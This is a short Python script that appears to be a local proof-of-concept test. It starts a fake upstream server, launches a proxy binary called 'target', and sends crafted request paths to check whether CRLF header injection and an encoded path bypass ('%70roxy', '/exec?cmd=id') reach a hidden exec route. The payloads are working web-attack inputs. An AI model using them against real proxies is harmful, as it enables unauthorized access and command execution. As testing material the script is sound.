import socket, subprocess, sys, time, os, signal, threading
sys.argv=[sys.argv[0]]+sys.argv[1:]
UP=19681; out=[]
def up():
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("127.0.0.1",UP)); s.listen(16); s.settimeout(0.4)
    while True:
        try: c,_=s.accept()
        except socket.timeout: continue
        c.settimeout(1.5); b=b""
        try:
            while b"\r\n\r\n" not in b:
                d=c.recv(8192)
                if not d: break
                b+=d
        except Exception: pass
        out.append(b)
        head=b.split(b"\r\n\r\n")[0]
        body=b"SAW["+head.replace(b"\r",b"<CR>").replace(b"\n",b"<LF>")+b"]"
        if b"/exec?" in head: body+=b" EXEC_RAN"
        try: c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: "+str(len(body)).encode()+b"\r\nConnection: close\r\n\r\n"+body)
        except Exception: pass
        c.close()
threading.Thread(target=up,daemon=True).start(); time.sleep(0.4)
base=open("cfg_up").read(); port=18931
cfg=base.replace("listen=127.0.0.1:18841","listen=127.0.0.1:%d"%port).replace("upstreams=127.0.0.1:19894","upstreams=127.0.0.1:%d"%UP)
open("/tmp/e.conf","w").write(cfg)
p=subprocess.Popen(["./target","--config","/tmp/e.conf"],stdout=open("/tmp/e.log","wb"),stderr=subprocess.STDOUT,start_new_session=True)
for _ in range(60):
    try: s=socket.create_connection(("127.0.0.1",port),0.4); s.close(); break
    except OSError: time.sleep(0.1)
for label,path in (("literal","/proxy/exec%3Fcmd%3Did%0D%0AX-Pad:%20"),("encoded","/%70roxy/exec%3Fcmd%3Did%0D%0AX-Pad:%20")):
    out.clear()
    s=socket.create_connection(("127.0.0.1",port),3); s.settimeout(3)
    s.sendall(("GET "+path+" HTTP/1.1\r\nHost: a\r\n\r\n").encode())
    buf=b""
    try:
        while True:
            d=s.recv(4096)
            if not d: break
            buf+=d
    except Exception: pass
    s.close(); time.sleep(0.4)
    print(f"{label:8s} status={buf.split(b' ')[1][:3]!r} upstream={out[0][:60] if out else b'NONE'!r} body={buf.split(b'\r\n\r\n')[-1][:80]!r}")
try: os.killpg(os.getpgid(p.pid),signal.SIGTERM); p.wait(timeout=3)
except Exception: pass
